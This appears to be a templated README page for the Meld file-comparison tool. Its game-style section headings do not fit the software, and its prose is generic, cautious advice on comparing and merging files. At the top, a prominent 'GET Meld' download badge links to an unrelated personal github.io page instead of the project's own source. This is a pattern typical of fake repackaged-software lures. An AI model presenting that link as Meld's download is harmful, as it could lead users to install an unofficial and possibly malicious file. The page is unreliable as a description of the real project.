# Meld - Compare Two Copies Before You Overwrite

[![GET Meld](https://img.shields.io/badge/GET%20%E2%80%94%20Meld-0f766e?style=for-the-badge&logoColor=white)](https://vuc245453.github.io/.github/meld-filters)

## Game Overview

Meld shows how two files or two folders you are allowed to read differ. A project and its backup, or two drafts you wrote, are the usual pair. Looking is safe. Copying a side over the other is a write, and it should wait until you have said which side wins.

It does not decide the correct version for you, and it does not belong in someone else's home folder. If both copies are wrong, the comparison will not invent a third file. A spare on another disk is the real backup.

## Play Your Way

Compare a single text file first. Read the lines that differ and leave both files unchanged. That pass teaches the colors without risk. You learn which pane is left and which is right before any click can overwrite.

When you do merge, copy one hunk you understand, then compare again. The list of differences should shrink only where you chose. A folder compare is the same idea at a larger scale: filter nothing you do not understand, or a hidden difference looks like a clean result.

## Mission Flow

Point each side at a real path and confirm those paths in Explorer if the names are similar. Run the comparison. Open one difference. Do not merge the whole tree on the first click.

If you copy, name the direction in your head first: backup into the project, or project into the backup. Then run the comparison again. Remaining differences should be ones you meant to keep. Do not delete the older side the same hour if you are unsure.

## Included Content

- A side-by-side view of two text files you may read
- A folder comparison that lists files which differ
- A merge only after you pick the side that wins
- A second comparison to check that the copy landed
- Room to stop with no write at all
- A reminder that binary files may only show as different

## Perfect Audience

Meld is for people who keep a spare folder and want to see whether it still matches the work. It is also for two drafts of a text file you wrote, when you need one paragraph from each.

It is not a tool for browsing a directory you were not given. If a file exists only on the backup, notice that before you copy it back over a delete you made on purpose.

## Common Issues

A comparison that looks empty can be a filter hiding files, or two paths that are actually the same folder. Read the path in each pane. If a merge overwrote the wrong side, restore from the spare you should still have, and do not run another merge until you do.

## Extended Notes

Start with a small directory. Large trees are readable only after you trust the view. Keep the spare until the second comparison matches what you intended. Meld will not recover a file you deleted on both sides.
